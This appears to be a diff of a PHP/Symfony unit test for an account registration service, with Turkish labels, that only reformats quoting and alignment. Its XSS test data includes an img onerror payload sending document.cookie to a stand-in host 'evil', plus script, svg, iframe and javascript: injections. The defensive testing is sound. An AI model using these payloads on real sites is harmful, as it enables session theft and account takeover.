@@ -28,8 +28,8 @@ use Symfony\Component\Cache\Adapter\ArrayAdapter;
 use Symfony\Component\HttpClient\MockHttpClient;
 use Symfony\Component\HttpClient\Response\MockResponse;
 use Symfony\Component\HttpFoundation\RequestStack;
-use Symfony\Component\PasswordHasher\Hasher\PasswordHasherFactory;
 use Symfony\Component\Messenger\MessageBusInterface;
+use Symfony\Component\PasswordHasher\Hasher\PasswordHasherFactory;
 use Symfony\Component\Routing\Generator\UrlGeneratorInterface;
 use Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface;
 use Symfony\Contracts\Translation\TranslatorInterface;
@@ -103,32 +103,32 @@ final class AccountRegistrationServiceTest extends TestCase
          * geçmiş tablosu bellek içi SQLite.
          */
         foreach ([
-            "security.password_min_length" => 8,
-            "security.password_required_classes" => 1,
-            "security.password_breach_check" => false,
-            "security.password_history_depth" => 0,
+            'security.password_min_length' => 8,
+            'security.password_required_classes' => 1,
+            'security.password_breach_check' => false,
+            'security.password_history_depth' => 0,
         ] as $key => $default) {
             $settings->addDefinition(new SettingDefinition(
                 key: $key,
                 label: $key,
-                type: "text",
+                type: 'text',
                 default: $default,
                 variants: [],
-                module: "core",
-                group: "security",
+                module: 'core',
+                group: 'security',
             ));
         }
 
         $passwordPolicy = new PasswordPolicy(
             $settings,
             new BreachChecker(
-                new MockHttpClient(static fn (): MockResponse => new MockResponse("", ["http_code" => 503])),
+                new MockHttpClient(static fn (): MockResponse => new MockResponse('', ['http_code' => 503])),
                 new ArrayAdapter(),
             ),
             new PasswordHistory(
-                DriverManager::getConnection(["driver" => "pdo_sqlite", "memory" => true]),
+                DriverManager::getConnection(['driver' => 'pdo_sqlite', 'memory' => true]),
                 new PasswordHasherFactory([
-                    PasswordAuthenticatedUserInterface::class => ["algorithm" => "bcrypt", "cost" => 4],
+                    PasswordAuthenticatedUserInterface::class => ['algorithm' => 'bcrypt', 'cost' => 4],
                 ]),
             ),
             $translator,
@@ -162,23 +162,23 @@ final class AccountRegistrationServiceTest extends TestCase
      */
     public static function legitimateNameProvider(): iterable
     {
-        yield 'Turkce (tam set)'      => ['Ali Çömez'];
-        yield 'Turkce (S, G, I)'      => ['Ayşe Gül Şahin'];
-        yield 'Turkce (noktasiz i)'   => ['Işıl Ünlü'];
-        yield 'kesme isareti'         => ["O'Brien"];
-        yield 'tipografik kesme'      => ['O’Brien'];
-        yield 'tire'                  => ['Jean-Luc'];
-        yield 'nokta (unvan)'         => ['Dr. Ahmet'];
-        yield 'Sirpca / Hirvatca'     => ['Đorđe Ćirić'];
-        yield 'Kiril'                 => ['Владимир'];
-        yield 'Yunanca'               => ['Γεώργιος'];
-        yield 'Arapca'                => ['محمد'];
-        yield 'CJK'                   => ['山田'];
-        yield 'aksanli Latin'         => ['José Ángel Muñoz'];
-        yield 'Almanca eszett'        => ['Weiß'];
-        yield 'cok parcali'           => ['Maria de los Ángeles'];
-        yield 'tek harf'              => ['X'];
-        yield 'tam 60 karakter'       => [str_repeat('a', 60)];
+        yield 'Turkce (tam set)' => ['Ali Çömez'];
+        yield 'Turkce (S, G, I)' => ['Ayşe Gül Şahin'];
+        yield 'Turkce (noktasiz i)' => ['Işıl Ünlü'];
+        yield 'kesme isareti' => ["O'Brien"];
+        yield 'tipografik kesme' => ['O’Brien'];
+        yield 'tire' => ['Jean-Luc'];
+        yield 'nokta (unvan)' => ['Dr. Ahmet'];
+        yield 'Sirpca / Hirvatca' => ['Đorđe Ćirić'];
+        yield 'Kiril' => ['Владимир'];
+        yield 'Yunanca' => ['Γεώργιος'];
+        yield 'Arapca' => ['محمد'];
+        yield 'CJK' => ['山田'];
+        yield 'aksanli Latin' => ['José Ángel Muñoz'];
+        yield 'Almanca eszett' => ['Weiß'];
+        yield 'cok parcali' => ['Maria de los Ángeles'];
+        yield 'tek harf' => ['X'];
+        yield 'tam 60 karakter' => [str_repeat('a', 60)];
     }
 
     #[DataProvider('legitimateNameProvider')]
@@ -203,13 +203,13 @@ final class AccountRegistrationServiceTest extends TestCase
     public static function xssPayloadProvider(): iterable
     {
         yield 'img onerror (rapordaki saldiri)' => ['<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">'];
-        yield 'script etiketi'                  => ['<script>alert(1)</script>'];
-        yield 'etiket kapatip svg acma'         => ['</b><svg onload=alert(1)>'];
-        yield 'oznitelik kacisi'                => ['Ali" onmouseover="alert(1)'];
-        yield 'iframe enjeksiyonu'              => ['<iframe src="//evil"></iframe>'];
-        yield 'HTML varlik kacisi'              => ['a&lt;script&gt;b'];
-        yield 'javascript: semasi'              => ['<a href="javascript:alert(1)">x</a>'];
-        yield 'style enjeksiyonu'               => ['<div style="position:fixed">x</div>'];
+        yield 'script etiketi' => ['<script>alert(1)</script>'];
+        yield 'etiket kapatip svg acma' => ['</b><svg onload=alert(1)>'];
+        yield 'oznitelik kacisi' => ['Ali" onmouseover="alert(1)'];
+        yield 'iframe enjeksiyonu' => ['<iframe src="//evil"></iframe>'];
+        yield 'HTML varlik kacisi' => ['a&lt;script&gt;b'];
+        yield 'javascript: semasi' => ['<a href="javascript:alert(1)">x</a>'];
+        yield 'style enjeksiyonu' => ['<div style="position:fixed">x</div>'];
     }
 
     #[DataProvider('xssPayloadProvider')]
@@ -240,18 +240,18 @@ final class AccountRegistrationServiceTest extends TestCase
      */
     public static function forbiddenCharacterProvider(): iterable
     {
-        yield 'kucuktur (<)'      => ['Ali<Veli'];
-        yield 'buyuktur (>)'      => ['Ali>Veli'];
-        yield 've (&)'            => ['Ali&Veli'];
-        yield 'cift tirnak'       => ['Ali"Veli'];
-        yield 'egik cizgi'        => ['Ali/Veli'];
-        yield 'ters egik cizgi'   => ['Ali\\Veli'];
-        yield 'rakam'             => ['Ali123'];
-        yield 'yeni satir'        => ["Ali\nVeli"];
-        yield 'sekme'             => ["Ali\tVeli"];
-        yield 'NUL bayti'         => ["Ali\0Veli"];
-        yield 'yuzde'             => ['Ali%20Veli'];
-        yield 'suslu parantez'    => ['Ali{Veli}'];
+        yield 'kucuktur (<)' => ['Ali<Veli'];
+        yield 'buyuktur (>)' => ['Ali>Veli'];
+        yield 've (&)' => ['Ali&Veli'];
+        yield 'cift tirnak' => ['Ali"Veli'];
+        yield 'egik cizgi' => ['Ali/Veli'];
+        yield 'ters egik cizgi' => ['Ali\\Veli'];
+        yield 'rakam' => ['Ali123'];
+        yield 'yeni satir' => ["Ali\nVeli"];
+        yield 'sekme' => ["Ali\tVeli"];
+        yield 'NUL bayti' => ["Ali\0Veli"];
+        yield 'yuzde' => ['Ali%20Veli'];
+        yield 'suslu parantez' => ['Ali{Veli}'];
     }
 
     #[DataProvider('forbiddenCharacterProvider')]
